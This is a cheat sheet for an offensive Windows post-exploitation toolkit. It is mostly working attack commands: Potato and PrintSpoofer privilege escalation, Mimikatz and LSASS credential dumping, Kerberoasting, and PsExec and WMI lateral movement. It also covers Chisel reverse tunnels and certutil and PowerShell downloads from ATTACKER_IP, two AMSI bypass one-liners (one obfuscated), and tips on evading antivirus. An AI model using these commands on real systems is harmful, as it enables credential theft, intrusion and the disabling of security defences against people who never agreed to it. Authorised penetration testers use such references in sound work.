# Windows Tools Usage Guide

## Directory Structure
```
windows-tools/
├── privilege-escalation/   # Potato exploits, PrintSpoofer, SharpUp
├── enumeration/            # WinPEAS, Seatbelt, SharpHound, PowerUp
├── credentials/            # LaZagne, Mimikatz, Rubeus, SharpDump
├── lateral-movement/       # PsExec, SharpRDP, Invoke-TheHash
├── persistence/            # SharPersist
└── misc/                   # Netcat, Chisel, PowerView, webshells
```

## Quick Reference

### Privilege Escalation
```powershell
# JuicyPotato (Windows Server 2016 and earlier)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# GodPotato (Windows Server 2019+)
GodPotato-NET4.exe -cmd "cmd /c whoami"

# PrintSpoofer
PrintSpoofer64.exe -i -c cmd

# SharpUp (enumerate privesc opportunities)
SharpUp.exe audit
```

### Enumeration
```powershell
# WinPEAS
winPEASx64.exe

# Seatbelt (all checks)
Seatbelt.exe -group=all

# SharpHound (BloodHound collection)
SharpHound.exe -c All

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Credential Dumping
```powershell
# LaZagne (all passwords)
LaZagne.exe all

# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Rubeus (Kerberoast)
Rubeus.exe kerberoast /outfile:hashes.txt

# SharpDump (dump LSASS)
SharpDump.exe
```

### Lateral Movement
```cmd
# PsExec
PsExec.exe \\TARGET -u DOMAIN\user -p password cmd

# WMI
wmic /node:TARGET /user:DOMAIN\user /password:password process call create "cmd.exe"
```

### Tunneling
```bash
# Chisel (on attacker)
./chisel server -p 8080 --reverse

# Chisel (on target)
chisel.exe client ATTACKER_IP:8080 R:socks
```

## Transfer Methods

### HTTP Server
```bash
# On attacker
python3 -m http.server 8000

# On target
certutil -urlcache -f http://ATTACKER_IP:8000/tool.exe tool.exe
# Or
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP:8000/tool.exe -OutFile tool.exe"
```

### SMB Server
```bash
# On attacker
impacket-smbserver share . -smb2support

# On target
copy \\ATTACKER_IP\share\tool.exe .
```

### Base64 Transfer
```bash
# On attacker
base64 tool.exe > tool.b64

# On target (PowerShell)
$b64 = Get-Content tool.b64
[IO.File]::WriteAllBytes("tool.exe", [Convert]::FromBase64String($b64))
```

## PowerShell AMSI Bypass
```powershell
# Option 1
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Option 2
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Notes
- Always check Windows version compatibility
- Use appropriate .NET version for GodPotato
- Transfer tools via base64 if AV blocks direct download
- Obfuscate PowerShell with Invoke-Obfuscation if needed
- Some tools may be flagged by Windows Defender

